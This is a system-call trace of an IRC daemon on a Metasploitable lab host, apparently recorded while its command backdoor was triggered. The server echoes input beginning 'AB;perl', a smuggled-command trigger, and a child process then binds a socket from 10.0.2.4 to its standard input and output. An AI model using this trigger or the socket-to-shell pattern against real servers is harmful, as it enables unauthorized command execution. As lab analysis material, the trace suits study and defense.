4519  07:22:17.559245 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:22:17.559324 time(NULL)        = 1495624937
4519  07:22:17.559339 time(NULL)        = 1495624937
4519  07:22:17.559364 gettimeofday({1495624937, 559370}, NULL) = 0
4519  07:22:17.559383 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:22:17.559430 clock_gettime(CLOCK_MONOTONIC, {1747, 376454711}) = 0
4519  07:22:17.559458 gettimeofday({1495624937, 559465}, NULL) = 0
4519  07:22:17.559475 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
8192  07:22:17.633914 <... accept resumed> {sa_family=AF_INET, sin_port=htons(46175), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
8192  07:22:17.633957 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a498) = -1 EINVAL (Invalid argument)
8192  07:22:17.633972 _llseek(8, 0, 0xbfb0a4e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.633984 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a498) = -1 EINVAL (Invalid argument)
8192  07:22:17.633995 _llseek(8, 0, 0xbfb0a4e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.634005 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
8192  07:22:17.634047 close(6)          = 0
8192  07:22:17.634116 dup(8)            = 6
8192  07:22:17.634129 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b338) = -1 EINVAL (Invalid argument)
8192  07:22:17.634140 _llseek(6, 0, 0xbfb0b380, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.634150 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
8192  07:22:17.634170 dup2(6, 1)        = 1
8192  07:22:17.634182 close(6)          = 0
8192  07:22:17.634192 fcntl64(1, F_SETFD, 0) = 0
8192  07:22:17.634203 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b308) = -1 EINVAL (Invalid argument)
8192  07:22:17.634213 _llseek(1, 0, 0xbfb0b350, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.634243 dup(8)            = 6
8192  07:22:17.634254 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b338) = -1 EINVAL (Invalid argument)
8192  07:22:17.634265 _llseek(6, 0, 0xbfb0b380, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8192  07:22:17.634275 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
8192  07:22:17.634291 dup2(6, 0)        = 0
8192  07:22:17.634301 close(6)          = 0
8192  07:22:17.634310 fcntl64(0, F_SETFD, 0) = 0
8192  07:22:17.634323 fcntl64(0, F_SETFD, 0) = 0
8192  07:22:17.634339 read(0,  <unfinished ...>
4519  07:22:17.634746 <... select resumed> ) = 1 (in [5], left {0, 930000})
4519  07:22:17.634770 clock_gettime(CLOCK_MONOTONIC, {1747, 451783713}) = 0
4519  07:22:17.634785 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:22:17.634798 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:22:17.634818 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:22:17.634835 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:22:17.634906 close(5)          = 0
4519  07:22:17.634941 gettimeofday({1495624937, 634946}, NULL) = 0
4519  07:22:17.634954 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 480000})
4519  07:22:18.147631 clock_gettime(CLOCK_MONOTONIC, {1747, 964651474}) = 0
4519  07:22:18.147653 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:22:18.147682 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147700 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147715 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147764 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147778 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147793 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147807 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147842 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147856 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147870 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147883 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147897 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147910 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147924 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147937 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147951 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147964 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.147978 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.148026 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.148045 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.148074 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.148087 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:18.148105 time(NULL)        = 1495624938
4519  07:22:18.148116 time(NULL)        = 1495624938
4519  07:22:18.148132 gettimeofday({1495624938, 148136}, NULL) = 0
4519  07:22:18.148145 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:22:18.148174 clock_gettime(CLOCK_MONOTONIC, {1747, 965186756}) = 0
4519  07:22:18.148184 gettimeofday({1495624938, 148188}, NULL) = 0
4519  07:22:18.148195 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
8192  07:22:18.156918 <... read resumed> "", 4096) = 0
8192  07:22:18.157062 close(8)          = 0
8192  07:22:18.157223 exit_group(0)     = ?
